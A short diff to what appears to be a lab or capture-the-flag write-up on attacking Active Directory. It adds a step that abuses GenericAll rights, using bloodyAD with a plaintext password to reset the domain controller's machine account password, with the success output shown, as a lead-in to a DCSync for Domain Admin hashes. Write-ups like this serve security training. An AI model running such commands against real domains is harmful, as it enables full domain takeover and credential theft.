@@ -294,3 +294,12 @@ This user has GenericAll over the DC host
 
 This means i can change the password of the DC host then perform a DC sync to obtain a Domain admin hash
 
+# Compromising the DC host
+
+```python
+bloodyAD --host EC2AMAZ-A5O4OL8.past.local -d past.local -u tyler -p '5rtfgvb%RTFGVB' -k set password 'CN=EC2AMAZ-A5O4OL8,OU=Domain Controllers,DC=past,DC=local' 'Password123!'
+
+[+] Password changed successfully!
+```
+
+Ill change the password using bloodyAD
